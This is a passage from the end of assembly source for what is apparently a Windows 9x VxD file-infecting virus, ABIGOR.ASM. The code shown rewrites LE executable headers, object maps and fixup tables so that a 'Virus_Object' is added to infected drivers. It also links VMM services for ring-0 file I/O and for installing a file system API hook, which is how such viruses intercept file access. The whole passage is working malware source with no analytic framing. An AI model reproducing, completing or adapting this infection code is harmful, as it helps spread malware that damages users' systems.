                   shl     eax,2 ;Shift left eax by "log2 IMAGE_SIZEOF_OBJECT_PAGE_HEADER"
                   add     eax,dword ptr [esi.LE_objmap]
                   mov     ebx,dword ptr [edi+(Virus_Object.OH_mapsize-File_Delta)]
                   add     dword ptr [esi.LE_mpages],ebx
                   push    ebx
                   shl     ebx,2 ;Shift left ebx by "log2 IMAGE_SIZEOF_OBJECT_PAGE_HEADER"
                   ;="log2 IMAGE_SIZEOF_FIXUP_PAGE_HEADER"
                   add     dword ptr [esi.LE_ldrsize],ebx
                   add     dword ptr [esi.LE_ldrsize],IMAGE_SIZEOF_OBJECT_HEADER
                   add     dword ptr [esi.LE_fixupsize],ebx
                   add     dword ptr [esi.LE_fixupsize],IMAGE_RLC_INTSIZE16
                   call    Move_Data
                   pop     ecx
                   mov     edx,dword ptr [edi+(Virus_Object.OH_pagemap-File_Delta)]
   Fill_Object_Page:
                   mov     ebx,edx
                   xchg    bl,bh
                   rol     ebx,16
                   xchg    bl,bh
                   ror     ebx,8
                   mov     dword ptr [eax.OPH_highpage],ebx
                   add     eax,IMAGE_SIZEOF_OBJECT_PAGE_HEADER
                   inc     edx
                   loop    Fill_Object_Page
                   mov     eax,dword ptr [DDB_Offset_Obj]
                   inc     eax ;Offset (within first object) of relocation
                   call    Calculate_Page
                   inc     ecx
                   shl     ecx,2 ;Shift left ecx by "log2 IMAGE_SIZEOF_FIXUP_PAGE_HEADER"
                   mov     eax,dword ptr [esi.LE_frectab]
                   call    Recalc
                   xchg    eax,ebx
                   mov     eax,dword ptr [esi.LE_fpagetab]
                   add     eax,ecx
                   call    Recalc
                   push    dword ptr [eax.FPH_offset]
   Fix_Fixup_Page:
                   add     dword ptr [eax.FPH_offset],IMAGE_RLC_INTSIZE16
                   add     eax,IMAGE_SIZEOF_FIXUP_PAGE_HEADER
                   cmp     eax,ebx
                   jb      Fix_Fixup_Page
                   mov     eax,dword ptr [esi.LE_frectab]
                   mov     ebx,dword ptr [edi+(Virus_Object.OH_mapsize-File_Delta)]
                   push    ebx
                   shl     ebx,2 ;Shift left ebx by "log2 IMAGE_SIZEOF_FIXUP_PAGE_HEADER"
                   call    Move_Data
                   pop     ecx
                   mov     ebx,dword ptr [eax.FPH_offset-IMAGE_SIZEOF_FIXUP_PAGE_HEADER]
   Fill_Fixup_Page:
                   mov     dword ptr [eax.FPH_offset+ecx*IMAGE_SIZEOF_FIXUP_PAGE_HEADER\
                   -IMAGE_SIZEOF_FIXUP_PAGE_HEADER],ebx
                   loop    Fill_Fixup_Page
                   pop     eax
                   add     eax,dword ptr [esi.LE_frectab]
                   mov     ebx,IMAGE_RLC_INTSIZE16
                   call    Move_Data
                   rol     edx,(FR_fixup.FH_soff)*8
                   mov     dx,(IMAGE_RLC_RINT shl 8)+IMAGE_RLC_ST_SOFF32
                   mov     dword ptr [eax.FR_stype],edx
                   mov     ebx,dword ptr [esi.LE_objcnt]
                   inc     ebx
                   mov     byte ptr [eax.FR_fixup.FH_obj],bl
                   mov     word ptr [eax.FR_fixup.FH_offset],0
                   mov     dword ptr [esi.LE_objcnt],ebx
                   clc
   Update_LE_Fail:
                   popad
                   ret

   ;Move LE info data forward and fix the appropriate LE header pointers
   ;þ On entry:
   ;  EAX=Starting offset (relative to the beginning of the LE header)
   ;  EBX=Number of bytes to move
   ;  ESI=Pointer to LE header
   ;  LE_Info_Mem=Pointer to LE info (allocated memory)
   ;  LE_Info_Size=Size of LE info
   ;þ On exit:
   ;  EAX=Address (in memory) of entry EAX
   ;  LE header updated
   ;  LE info updated
   Move_Data:
                   pushad
                   call    Fix_Pointers
                   sub     eax,IMAGE_SIZEOF_VXD_HEADER
                   mov     ecx,dword ptr [LE_Info_Size]
                   mov     edi,dword ptr [LE_Info_Mem]
                   add     edi,ecx
                   dec     edi
                   sub     ecx,ebx
                   sub     ecx,eax
                   mov     esi,edi
                   sub     esi,ebx
                   std
                   rep     movsb ;Move data
                   cld ;Restore direction flag for the VMM!
                   popad
                   jmp     Recalc

   ;Get "object table" address (first object)
   ;þ On entry:
   ;  ESI=Pointer to LE header
   ;  LE_Info_Mem=Pointer to LE info (allocated memory)
   ;þ On exit:
   ;  EAX=Pointer to "object table"
   Get_Object_Table:
                   mov     eax,dword ptr [esi.LE_objtab]
   Recalc:
                   sub     eax,IMAGE_SIZEOF_VXD_HEADER
                   add     eax,dword ptr [LE_Info_Mem]
                   ret

   ;Fix LE header pointers (resident), that follow the "object table"
   ;þ On entry:
   ;  EAX=Starting offset (relative to the beginning of the LE header)
   ;  EBX=Number of bytes to add to pointer (if pointeròEAX)
   ;  ESI=Pointer to LE header
   ;þ On exit:
   ;  EDX=?
   ;  LE header updated
   Fix_Pointers:
                   lea     edx,[esi.LE_objmap]
                   call    Adjust_Pointer
                   lea     edx,[esi.LE_restab]
                   call    Adjust_Pointer
                   lea     edx,[esi.LE_enttab]
                   call    Adjust_Pointer
                   lea     edx,[esi.LE_fpagetab]
                   call    Adjust_Pointer
                   lea     edx,[esi.LE_frectab]
                   call    Adjust_Pointer
                   lea     edx,[esi.LE_impmod]
                   call    Adjust_Pointer
                   lea     edx,[esi.LE_impproc]
                   ;call Adjust_Pointer
                   ;ret

   Adjust_Pointer:
                   cmp     dword ptr [edx],eax
                   jb      Adjust_Pointer_Exit ;Check for 0 and lower pointer
                   add     dword ptr [edx],ebx
   Adjust_Pointer_Exit:
                   ret

   ;Fix dynamic links
   Fix_Dynamic_Links:
                   mov     ax,1234h
                   org     $-2
                   int     Dyna_Link_Int
                   lea     ebx,[esi+(Dynamic_Link1-Start_Delta)]
                   mov     dword ptr [ebx],eax
                   mov     dword ptr [ebx+2],@@Test_Debug_Installed
                   lea     ebx,[esi+(Dynamic_Link2-Start_Delta)]
                   mov     dword ptr [ebx],eax
                   mov     dword ptr [ebx+2],@@Hook_Device_Service
                   lea     ebx,[esi+(Dynamic_Link3-Start_Delta)]
                   mov     dword ptr [ebx],eax
                   mov     dword ptr [ebx+2],@@_HeapAllocate
                   lea     ebx,[esi+(Dynamic_Link4-Start_Delta)]
                   mov     dword ptr [ebx],eax
                   mov     dword ptr [ebx+2],@@_HeapFree
                   lea     ebx,[esi+(Dynamic_Link5-Start_Delta)]
                   mov     dword ptr [ebx],eax
                   mov     dword ptr [ebx+2],@@IFSMgr_InstallFileSystemApiHook
                   lea     ebx,[esi+(Dynamic_Link6-Start_Delta)]
                   mov     dword ptr [ebx],eax
                   mov     dword ptr [ebx+2],@@UniToBCSPath
                   lea     ebx,[esi+(Dynamic_Link7-Start_Delta)]
                   mov     dword ptr [ebx],eax
                   mov     dword ptr [ebx+2],@@IFSMgr_Ring0_FileIO
                   ret

   My_HeapAllocate:
                   push    0 ;Flags
                   push    eax ;Size (in bytes)
   Dynamic_Link3:
                   VMMCall _HeapAllocate
                   pop     ecx
                   pop     ecx
                   or      eax,eax
                   ret

   My_HeapFree:
                   push    0 ;Flags
                   push    eax ;Address of block
   Dynamic_Link4:
                   VMMCall _HeapFree
                   pop     ecx
                   pop     ecx
                   ret

   ;File input/output
   FileIO_Write:
                   mov     eax,R0_WRITEFILE
                   jmp     Simulate_FileIO
   FileIO_Read:
                   mov     eax,R0_READFILE
   Simulate_FileIO:
                   mov     ebx,dword ptr [File_Handle]
   Original_FileIO:
   Dynamic_Link7:
                   VxDCall IFSMgr_Ring0_FileIO
                   ret

   Virus_Object    IMAGE_OBJECT_HEADER <Virus_Physical_Size,0,IMAGE_OBJ_READ\
                   +IMAGE_OBJ_WRITE+IMAGE_OBJ_EXEC+IMAGE_OBJ_DISCARD+IMAGE_OBJ_BIGDEF,,\
                   ,"NROH">

   Virus_Physical_End:

   File_Buffer     db      (size IMAGE_VXD_HEADER) dup (0)
   DDB_Buffer      db      (size VxD_Desc_Block) dup (0)

   Virus_Virtual_End:

   VxD_CODE_ENDS

                   end
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ End of file: ABIGOR.ASM ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
